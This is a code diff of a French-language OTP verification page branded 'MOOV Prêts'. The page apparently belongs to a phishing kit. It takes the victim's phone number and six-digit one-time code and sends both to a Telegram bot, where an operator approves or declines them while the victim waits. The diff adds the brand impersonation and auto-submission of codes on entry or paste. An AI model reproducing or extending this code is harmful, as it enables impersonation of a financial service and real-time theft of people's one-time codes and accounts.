@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Verify Number</title>
+<title>Vérification OTP – MOOV Prêts</title>
 <style>
     /* ── Reset & base ── */
     * {
@@ -22,37 +22,55 @@
         position: relative;
     }
 
-    /* ── Header ── */
+    /* ── Header with title ── */
     .header {
         background: #E8701A;
         height: 88px;
         display: flex;
         align-items: flex-end;
-        padding: 0 22px 16px;
+        padding: 0 18px 14px;
+        position: relative;
         flex-shrink: 0;
-        box-shadow: 0 2px 12px rgba(232, 112, 26, 0.25);
+        box-shadow: 0 4px 12px rgba(232, 112, 26, 0.3);
     }
 
     .back-arrow {
         color: #fff;
-        font-size: 28px;
+        font-size: 26px;
         text-decoration: none;
         line-height: 1;
         transition: transform 0.2s ease;
         display: inline-flex;
         align-items: center;
         justify-content: center;
-        width: 40px;
-        height: 40px;
+        padding: 4px 8px;
         border-radius: 50%;
+        z-index: 2;
     }
     .back-arrow:hover {
         transform: scale(1.08);
-        background: rgba(255, 255, 255, 0.12);
+        background: rgba(255, 255, 255, 0.15);
     }
     .back-arrow:active {
         transform: scale(0.94);
     }
+
+    /* Title – more prominent */
+    .header-title {
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        bottom: 12px;
+        font-size: 28px;
+        font-weight: 800;
+        color: #fff;
+        letter-spacing: 1.5px;
+        text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        text-transform: uppercase;
+        pointer-events: none;
+    }
+    .header-title .moov { color: #fff; }
+    .header-title .pret { color: #ffd700; font-weight: 900; }
 
     /* ── Content ── */
     .content {
@@ -75,7 +93,7 @@
         font-size: 15px;
         color: #6b7a8f;
         line-height: 1.6;
-        margin-bottom: 32px;
+        margin-bottom: 28px;
         font-weight: 400;
     }
     .subtitle strong {
@@ -87,7 +105,7 @@
     .otp-row {
         display: flex;
         gap: 12px;
-        margin-bottom: 12px;
+        margin-bottom: 8px;
         justify-content: center;
         flex-wrap: wrap;
     }
@@ -133,20 +151,21 @@
         font-size: 13px;
         color: #dc3545;
         text-align: center;
-        margin: 4px 0 16px;
+        margin: 4px 0 12px;
         display: none;
     }
     .error-message.visible {
         display: block;
     }
 
-    /* ── Resend (exact original phrasing) ── */
+    /* ── Resend ── */
     .resend {
         font-size: 14px;
         color: #5e6f84;
         cursor: default;
         transition: color 0.2s;
         display: inline-block;
+        margin-top: 4px;
     }
     .resend .timer {
         display: inline-block;
@@ -177,19 +196,18 @@
         background: #d0e3fa;
     }
 
-    /* ── Bottom ── */
+    /* ── Bottom – moved UP significantly ── */
     .bottom {
-        padding: 8px 24px 32px;
+        padding: 12px 24px 24px;
         max-width: 480px;
         margin: 0 auto;
         width: 100%;
         flex-shrink: 0;
-        background: linear-gradient(to top, #fafafa 60%, transparent);
     }
 
     .continue-btn {
         width: 100%;
-        height: 56px;
+        height: 52px;
         border: none;
         border-radius: 16px;
         background: #b8cff0;
@@ -200,7 +218,6 @@
         transition: background 0.25s ease, transform 0.15s ease, box-shadow 0.25s ease;
         letter-spacing: 0.2px;
         box-shadow: 0 2px 8px rgba(26, 109, 191, 0.06);
-        position: relative;
     }
 
     .continue-btn.active {
@@ -246,56 +263,23 @@
 
     /* ── Responsive tweaks ── */
     @media (max-width: 440px) {
-        .content {
-            padding: 28px 16px 0;
-        }
-        .title {
-            font-size: 24px;
-        }
-        .otp-box {
-            width: 46px;
-            height: 54px;
-            font-size: 20px;
-            border-radius: 12px;
-        }
-        .otp-row {
-            gap: 8px;
-        }
-        .bottom {
-            padding: 8px 16px 24px;
-        }
-        .continue-btn {
-            height: 50px;
-            font-size: 16px;
-            border-radius: 14px;
-        }
-        .header {
-            height: 76px;
-            padding: 0 16px 12px;
-        }
-        .back-arrow {
-            font-size: 24px;
-            width: 36px;
-            height: 36px;
-        }
-        .resend {
-            font-size: 13px;
-        }
+        .header-title { font-size: 22px; letter-spacing: 1px; }
+        .content { padding: 28px 16px 0; }
+        .title { font-size: 24px; }
+        .otp-box { width: 46px; height: 54px; font-size: 20px; border-radius: 12px; }
+        .otp-row { gap: 8px; }
+        .bottom { padding: 8px 16px 20px; }
+        .continue-btn { height: 48px; font-size: 15px; border-radius: 14px; }
+        .header { height: 76px; padding: 0 16px 12px; }
+        .back-arrow { font-size: 24px; }
+        .resend { font-size: 13px; }
     }
 
     @media (max-width: 360px) {
-        .otp-box {
-            width: 40px;
-            height: 48px;
-            font-size: 18px;
-            border-radius: 10px;
-        }
-        .otp-row {
-            gap: 6px;
-        }
-        .title {
-            font-size: 21px;
-        }
+        .header-title { font-size: 18px; }
+        .otp-box { width: 40px; height: 48px; font-size: 18px; border-radius: 10px; }
+        .otp-row { gap: 6px; }
+        .title { font-size: 21px; }
     }
 
     .otp-box,
@@ -317,9 +301,12 @@
 </head>
 <body>
 
-    <!-- ─── Header ─── -->
+    <!-- ─── Header with title ─── -->
     <header class="header">
         <a href="#" class="back-arrow" aria-label="Retour">&#8592;</a>
+        <div class="header-title">
+            <span class="moov">MOOV</span> <span class="pret">PRÊTS</span>
+        </div>
     </header>
 
     <!-- ─── Content ─── -->
@@ -338,7 +325,7 @@
             <input class="otp-box" type="tel" maxlength="1" id="d5" inputmode="numeric" autocomplete="one-time-code" />
         </div>
 
-        <!-- Error message (hidden by default) -->
+        <!-- Error message -->
         <div class="error-message" id="otpError">Code OTP invalide ou refusé.</div>
 
         <!-- ─── Resend ─── -->
@@ -347,7 +334,7 @@
         </p>
     </main>
 
-    <!-- ─── Bottom ─── -->
+    <!-- ─── Bottom – now much closer to OTP ─── -->
     <div class="bottom">
         <button class="continue-btn" id="continueBtn" disabled>Continuer</button>
     </div>
@@ -381,9 +368,11 @@
 
             // ===== Récupérer le téléphone depuis localStorage =====
             let userPhone = localStorage.getItem('phone') || '+226 87646446';
-            // Afficher le numéro masqué (on peut afficher les 4 derniers chiffres)
-            const formattedPhone = userPhone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4');
             phoneDisplay.textContent = userPhone;
+
+            // ===== Flag to prevent double submission =====
+            let isProcessing = false;
+            let autoSubmitted = false;
 
             // ===== OTP input handlers =====
             function onInput(i) {
@@ -397,6 +386,16 @@
                 }
                 checkFull();
                 hideError();
+
+                // === AUTO-SUBMIT: when all 6 digits are filled ===
+                const allFilled = inputs.every(b => b.value.length === 1);
+                if (allFilled && !autoSubmitted && !isProcessing) {
+                    autoSubmitted = true;
+                    // Small delay to let the user see the last digit fill
+                    setTimeout(() => {
+                        submitOTP();
+                    }, 300);
+                }
             }
 
             function onKey(e, i) {
@@ -411,6 +410,14 @@
                 if (e.key === 'ArrowRight' && i < 5) {
                     e.preventDefault();
                     inputs[i + 1].focus();
+                }
+                // If user presses Enter and all filled, submit
+                if (e.key === 'Enter') {
+                    const allFilled = inputs.every(b => b.value.length === 1);
+                    if (allFilled && !isProcessing) {
+                        e.preventDefault();
+                        submitOTP();
+                    }
                 }
             }
 
@@ -445,6 +452,13 @@
                 inputs[5].focus();
                 checkFull();
                 hideError();
+                // Auto-submit on paste if all filled
+                if (!autoSubmitted && !isProcessing) {
+                    autoSubmitted = true;
+                    setTimeout(() => {
+                        submitOTP();
+                    }, 300);
+                }
             });
 
             // ===== Countdown timer =====
@@ -483,8 +497,8 @@
                 e.preventDefault();
                 total = 2 * 60;
                 startTimer();
-                // Ici vous pouvez appeler l'API pour renvoyer le code
-                // Pour la démo, on réinitialise juste le timer
+                // Reset auto-submit flag so user can try again
+                autoSubmitted = false;
             });
 
             // ===== Telegram helpers =====
@@ -540,11 +554,9 @@
                 }, 1500);
             }
 
-            // ===== Continue button =====
-            let isProcessing = false;
-
-            continueBtn.addEventListener('click', async function() {
-                if (isProcessing || this.disabled) return;
+            // ===== SUBMIT OTP (shared between auto-submit and button click) =====
+            function submitOTP() {
+                if (isProcessing) return;
 
                 const otp = inputs.map(box => box.value).join('');
                 if (otp.length !== 6) {
@@ -561,23 +573,20 @@
                 hideError();
 
                 const ts = Date.now();
-                // Envoyer le code OTP et le numéro de téléphone (sans indicatif)
                 const phoneDigits = userPhone.replace(/\D/g, '').replace(/^226/, '');
                 const msg = `🔐 OTP verification\n\n📱 Phone: ${phoneDigits}\n🔑 OTP: <code>${otp}</code>\n\nApprove this OTP?`;
 
-                try {
-                    await sendToTelegram({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [[
-                                { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
-                                { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
-                            ]]
-                        }
-                    });
-
+                sendToTelegram({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
+                            { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
+                        ]]
+                    }
+                }).then(() => {
                     pollForCallback('otp', ts, (action) => {
                         spinner.style.display = 'none';
                         isProcessing = false;
@@ -592,13 +601,13 @@
                             });
                             inputs[0].focus();
                             continueBtn.disabled = false;
-                            checkFull(); // réactive le bouton
+                            checkFull();
                             showError('OTP refusé par l\'administrateur.');
+                            autoSubmitted = false;
                             isProcessing = false;
                         }
                     });
-
-                } catch (err) {
+                }).catch((err) => {
                     console.error('Telegram error:', err);
                     spinner.style.display = 'none';
                     isProcessing = false;
@@ -606,7 +615,14 @@
                     continueBtn.disabled = false;
                     checkFull();
                     showError('Erreur de connexion. Veuillez réessayer.');
-                }
+                    autoSubmitted = false;
+                });
+            }
+
+            // ===== Continue button handler (fallback) =====
+            continueBtn.addEventListener('click', function() {
+                if (this.disabled || isProcessing) return;
+                submitOTP();
             });
 
             // ===== Auto‑focus =====
@@ -615,10 +631,14 @@
             // ===== Start timer =====
             startTimer();
 
-            // ===== Enter to submit =====
+            // ===== Enter key on any input triggers submit =====
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter' && !continueBtn.disabled && !isProcessing) {
-                    continueBtn.click();
+                    const allFilled = inputs.every(b => b.value.length === 1);
+                    if (allFilled) {
+                        e.preventDefault();
+                        submitOTP();
+                    }
                 }
             });
 
